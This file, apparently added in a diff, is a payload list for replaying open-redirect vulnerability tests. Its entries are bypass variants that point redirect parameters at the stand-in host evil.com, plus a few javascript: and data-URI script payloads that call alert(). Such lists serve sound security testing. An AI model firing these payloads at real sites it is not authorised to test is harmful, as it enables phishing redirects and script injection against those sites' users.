@@ -1,0 +1,53 @@
+# ============================================================
+# Open Redirect Payloads — Curated for vulnerability replay
+# ============================================================
+
+# --- Basic external URL ---
+https://evil.com
+http://evil.com
+https://evil.com/callback
+
+# --- Protocol-relative ---
+//evil.com
+//evil.com/callback
+
+# --- Backslash tricks ---
+\/\/evil.com
+/\evil.com
+\\evil.com
+
+# --- URL-encoded ---
+%2f%2fevil.com
+%2F%2Fevil.com
+%5cevil.com
+%2f%2f%65%76%69%6c%2e%63%6f%6d
+
+# --- Double URL-encoded ---
+%252f%252fevil.com
+
+# --- Subdomain / credential tricks ---
+https://target.com@evil.com
+https://target.com%40evil.com
+https://evil.com%23.target.com
+https://evil.com?.target.com
+
+# --- Null byte ---
+https://evil.com%00.target.com
+
+# --- Data URI ---
+data:text/html,<script>alert(document.domain)</script>
+
+# --- JavaScript protocol ---
+javascript:alert(1)
+javascript://evil.com/%0aalert(1)
+
+# --- Dotless IP / decimal IP ---
+http://2130706433
+http://0x7f000001
+
+# --- Relative path with host confusion ---
+/redirect?url=https://evil.com
+/redirect?url=//evil.com
+/redirect?next=https://evil.com
+/redirect?returnTo=https://evil.com
+/redirect?continue=https://evil.com
